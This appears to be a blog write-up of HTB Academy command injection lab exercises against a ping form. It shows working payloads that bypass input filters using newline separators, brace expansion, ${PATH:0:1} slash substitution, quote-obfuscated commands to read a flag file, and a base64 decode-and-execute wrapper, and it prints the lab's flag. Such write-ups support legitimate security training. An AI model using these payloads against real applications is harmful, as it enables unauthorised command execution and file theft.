---
layout: writeup
title: "HTB Academy - Command Injection Techniques"
date: 2026-03-27

platform: HTB Academy
difficulty: Academy
os: Linux
status: Retired

stuck_summary: "So many mini tests, so many problems but cat won't work if you don't specify the path"

tags:
  - linux
  - command-injection
  - burpsuite
  - filter-bypass
  - base64
  - obfuscation
  - newline-injection
  - htb-academy
---

## Overview

These are the interactive technique exercises from the HTB Academy Command Injection module. Six tasks covering injection detection, operator testing, space and character filter bypasses, command obfuscation, and base64 encoding. The skill assessment is covered separately.

---

## Exercise 1 — Basic Injection Detection

**Concept:** Web applications that pass user input directly to shell commands are vulnerable to injection. A semicolon `;` lets you append a second command after the legitimate one.

The target was a basic ping field — enter an IP, get a ping result back.

**What was tried:**
```
127.0.0.1; whoami
```

**Result:**
```
Please maintain the required format
```

The application is filtering input. The error message itself was the answer to submit for this task — confirming the filter exists and what it returns.

> The filter error tells you two things: input validation exists, and it's client-side or pattern-based. Neither is reliable. The next step is always to find out exactly what's being filtered and how.

---

## Exercise 2 — Source Code Inspection

**Concept:** Client-side filters are visible in the page source. Always check before assuming a filter is server-side.

Used `Ctrl+U` in Firefox to view the page source. Navigated to line 17 — a regex pattern was visible there explaining exactly why the semicolon triggered the error.

**Answer:** Line 17

> `Ctrl+U` is one of the most underused recon steps on web challenges. The filter logic, hidden fields, comments, and API endpoints are all sitting there in plain text. Always look before trying to bypass blind.

---

## Exercise 3 — Operator Testing

**Concept:** Different injection operators behave differently. If one is filtered, others may not be.

Tested the remaining operators one by one:

| Operator | Result |
|----------|--------|
| `;` | Blocked |
| `&&` | Blocked |
| `\|` | Blocked |
| `%0a` (newline) | ✓ Works |

**The working operator:** Newline (`%0a`)

> URL-encoded newline `%0a` is frequently missed by filters that look for `;`, `&&`, and `\|` as literal characters. The shell treats a newline as a command separator the same way it treats a semicolon — the filter just doesn't know to look for it.

---

## Exercise 4 — Bypass Space Filters

**Concept:** Some filters strip spaces from input. Environment variables can substitute for characters that are blocked.

**Setup:** Intercept a valid request in Burp Suite, send to Repeater. The `ip` parameter currently contains `127.0.0.1`.

**Crafted payload:**
```
127.0.0.1%0a{ls,-la}
```

Curly brace expansion `{ls,-la}` passes the `-la` flag to `ls` without using a space character. The newline `%0a` acts as the command separator.

**Result:** Directory listing returned, including `index.php` with a file size of **1613**.

> `{cmd,-flag}` is the standard space bypass. The shell expands it to `cmd -flag` before execution — the space never appears in the raw input string that the filter sees.

---

## Exercise 5 — Bypass Character Filters

**Concept:** Filters that block `/` can be bypassed using shell variable slicing. `${PATH:0:1}` extracts the first character of `$PATH`, which is always `/`.

**Task:** Find the username in `/home`.

**Crafted payload:**
```
127.0.0.1%0a{ls,${PATH:0:1}home}
```

Breaking this down:
- `%0a` — newline separator
- `{ls,${PATH:0:1}home}` — runs `ls /home` without using a literal `/` or space

**Result:**
```
1nj3c70r
```

Username confirmed: `1nj3c70r`

> `${PATH:0:1}` is the most reliable slash substitute. `$PATH` always starts with `/usr/...` so position 0 is always a forward slash. Similarly `${IFS}` substitutes for spaces on systems where `$IFS` is set to whitespace.

---

## Exercise 6 — Bypass Blocklist Commands

**Concept:** Filters that block specific commands like `cat` match against the literal string. Inserting quote characters breaks the string match while the shell ignores them during execution.

**Task:** Read the flag from `/home/1nj3c70r/flag.txt`.

**First attempt — cat blocked:**
```
127.0.0.1%0a{cat,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
```

Result: Command detected and blocked.

**Fix — obfuscate cat with quotes:**
```
127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

Breaking down the `c'a't` trick:
- The filter sees `c'a't` — doesn't match `cat`, passes through
- The shell strips the quotes during execution — runs `cat`
- Same technique works with `\` instead of quotes: `c\at`

**Result:** Flag returned.

<details>
<summary>🚩 Flag — click to reveal</summary>

HTB{6451c_f1l73r5_w0n7_570p_m3}

</details>

---

## Exercise 7 — Base64 Encoding Bypass

**Concept:** If all character and command filters are too strict to bypass directly, encode the entire payload in base64 and decode it at runtime. The filter never sees the actual command.

**Setup:** Same intercept workflow in Burp Suite.

**How it works:**
1. Take your desired command and base64 encode it
2. Inject a payload that decodes and executes the base64 string at runtime
3. The filter only sees base64 characters — no blocked commands, no blocked characters

**Crafted payload structure:**
```
127.0.0.1%0abash<<<$(base64%09-d<<<Add_Base64_String_Here)
```

Breaking this down:
- `bash<<<` — here-string, feeds the decoded output directly to bash
- `$(base64%09-d<<<...)` — decodes the base64 string (`%09` is a tab, substituting for space)
- `Add_Base64_String_Here` — your encoded command

**Result:** Decoded and executed successfully.

```
/user/share/mysql/debian_create_root_user.sql
```

> Base64 bypass is the nuclear option — use it when everything else is filtered. The only characters in the payload are alphanumeric plus `+`, `/`, and `=`, which almost no filter blocks. The `<<<` here-string and `%09` tab substitution handle the remaining character restrictions.

---

## Key Takeaways

- **`Ctrl+U` first** — always view page source before trying to bypass blind. The filter logic is often sitting there.
- **Try `%0a` when `;` is blocked** — newline injection is the most commonly missed operator in filters.
- **Space bypasses:** `{cmd,-flag}` curly brace expansion, `${IFS}`, or `%09` (tab)
- **Slash bypass:** `${PATH:0:1}` — always resolves to `/`
- **Command obfuscation:** `c'a't` or `c\at` breaks string matching while the shell executes normally
- **Base64 last resort:** Encode the entire command, decode at runtime with `bash<<<$(base64%09-d<<<...)`
- **Build your payload incrementally** — confirm each step works before adding the next layer of obfuscation

| Bypass type | Technique |
|-------------|-----------|
| Space | `{cmd,-flag}` or `${IFS}` or `%09` |
| Slash | `${PATH:0:1}` |
| Semicolon | `%0a` newline |
| Cat blocked | `c'a't` or `c\at` |
| Everything blocked | Base64 encode + `bash<<<$(base64 -d<<<...)` |
